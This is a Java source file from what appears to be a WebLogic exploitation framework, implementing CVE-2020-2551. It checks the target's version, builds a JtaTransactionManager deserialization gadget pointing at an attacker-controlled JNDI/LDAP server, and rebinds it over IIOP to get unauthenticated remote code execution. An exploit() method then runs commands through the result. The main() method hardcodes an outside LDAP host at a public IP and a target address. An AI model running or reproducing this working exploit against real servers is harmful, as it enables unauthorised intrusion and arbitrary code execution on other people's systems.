/*
 * Copyright (c) 2020. r4v3zn.
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 * http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

package com.weblogic.framework.vuls.impl;

import com.weblogic.framework.annotation.Authors;
import com.weblogic.framework.annotation.Dependencies;
import com.weblogic.framework.annotation.Versions;
import com.weblogic.framework.entity.MyException;
import com.weblogic.framework.gadget.ObjectGadget;
import com.weblogic.framework.gadget.impl.JtaTransactionManagerGadget;
import com.weblogic.framework.entity.VulCheckParam;
import com.weblogic.framework.utils.ReflectionUtils;
import com.weblogic.framework.utils.VulUtils;
import com.weblogic.framework.vuls.VulTest;
import org.apache.commons.lang3.StringUtils;
import javax.naming.Context;
import java.io.Serializable;
import java.net.URL;
import java.net.URLClassLoader;
import static com.weblogic.framework.utils.ClassLoaderUtils.loadJar;
import static com.weblogic.framework.utils.ContextUtils.getContext;
import static com.weblogic.framework.utils.UrlUtils.checkUrl;
import static com.weblogic.framework.utils.VersionUtils.checkVersion;
import static com.weblogic.framework.utils.VersionUtils.getVersion;

/**
 * Title: CVE-2020-2551
 * Desc:
 * <p>
 *     攻击者可以通过 IIOP 协议远程访问 Weblogic Server 服务器上的远程接口，传入恶意数据，从而获取服务器 权限并在未授权情况下远程执行任意代码。
 *     漏洞影响版本:
 *     Oracle WebLogic Server 10.3.6.0.0
 *     Oracle WebLogic Server 12.1.3.0.0
 *     Oracle WebLogic Server 12.2.1.3.0
 *     Oracle WebLogic Server 12.2.1.4.0
 *     github: https://github.com/0nise/CVE-2020-2551
 *     paper: https://www.r4v3zn.com/posts/b64d9185/
 * </p>
 * Date:2020/3/23 23:05
 * Email:woo0nise@gmail.com
 * @version 1.0.0
 */
@Authors({Authors.R4V3ZN,Authors.LUFEI})
@Dependencies({":JtaTransactionManager"})
@Versions({"10.3.6.0", "12.1.3.0", "12.2.1.3.0", "12.2.1.4.0"})
public class CVE_2020_2551 implements VulTest {

    /**
     * 漏洞利用 jar 文件名称
     */
    public static final String[] VUL_DEPENDENCIES = new String[]{"com.bea.core.repackaged.springframework.spring.jar", "com.bea.core.repackaged.apache.commons.logging.jar"};

    /**
     * 漏洞影响版本
     */
    private static final String[] VUL_VERSIONS = new String[]{"10.3.6.0", "10.3.6.0.0", "12.1.3.0", "12.1.3.0.0", "12.2.1.3.0", "12.2.1.3.0.0", "12.2.1.4.0", "12.2.1.4.0.0"};

    /**
     * current context
     */
    private Context currentContext = null;

    /**
     * remote
     */
    private Object remote = null;

    /**
     * bind name
     */
    private String bindName = "";

    /**
     * 漏洞验证,漏洞存在返回 true 否则返回 false
     * @param url url
     * @param vulCheckParam 漏洞校验额外参数
     * @return 漏洞存在返回 true 否则返回 false
     * @throws Exception 抛出异常
     */
    public Boolean vulnerable(String url, VulCheckParam vulCheckParam) throws Exception{
//        url = checkUrl(url);
        URL checkURL = new URL(url);
        String ip = checkURL.getHost();
        Integer port = checkURL.getPort() == -1 ? checkURL.getDefaultPort():checkURL.getPort();
        String version = getVersion(ip, port);
        version = version.replace(".0.0",".0");
        Boolean flag = checkVersion(version, VUL_VERSIONS);
        if(!flag){
            return false;
        }
        URLClassLoader urlClassLoader = null;
        try{
            if(version.startsWith("12.2.")){
                version = "12.2.1.3.0";
            }else{
                version = "10.3.6.0";
            }
            urlClassLoader = loadJar(version, VUL_DEPENDENCIES);
        }catch (Exception e){
            e.printStackTrace();
            return false;
        }
        String jndiUrl = "balabalabala://127.0.0.1:6789/Exploit";
        if(!StringUtils.isBlank(vulCheckParam.getJndiUrl())){
            jndiUrl = vulCheckParam.getJndiUrl();
        }
        ObjectGadget<Serializable> objectPayload = new JtaTransactionManagerGadget();
        Object object = objectPayload.getObject(jndiUrl,urlClassLoader);
        String iiopUrl = String.format("iiop://%s:%s", ip, port);
        try{
            Context context = getContext(iiopUrl);
            this.currentContext = context;
            context.rebind("hello",object);
        }catch (Exception e){
            e.printStackTrace();
            //
        }finally {
            urlClassLoader = null;
            System.gc();
        }
        try{
            Object objectCall = this.currentContext.lookup("hello");
            this.remote = objectCall;
        }catch (Exception e){
            return false;
        }
        return true;
    }

    /**
     * 漏洞校验
     * @param url url
     * @param param 执行参数
     * @return
     * @throws Exception
     */
    @Override
    public String exploit(String url, String... param) throws Exception {
//        throw new MyException(this.getClass().getSimpleName().replace("_","-")+" 不支持回显");
        return VulUtils.exploit(url, remote, param);
    }

    public static void main(String[] args) throws Exception {
        CVE_2020_2551 vul = new CVE_2020_2551();
        String jndiUrl = "ldap://192.168.1.6:1099/poc";
        jndiUrl = "ldap://36.110.239.156:1099/poc";
//        jdnUrl = "ldap://10.10.10.172:1099/poc";
//        System.out.println(vul.vulnerable("10.10.10.172", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.168", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.173", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.162", 7001,jdnUrl));
//        System.out.println(vul.vulnerable("10.10.10.165", 7001,jdnUrl));
        VulCheckParam param = new VulCheckParam();
        param.setJndiUrl(jndiUrl);
        vul.vulnerable("http://10.128.148.47:7001/",param);
//        vul.vulnerable("http://192.168.1.9:7001/",param);
//        vul.vulnerable("http://192.168.1.12:7001/", param);
//        vul.vulnerable("http://192.168.1.3:7001/", param);
//        vul.vulnerable("http://192.168.1.3:7001/", param);
    }
}
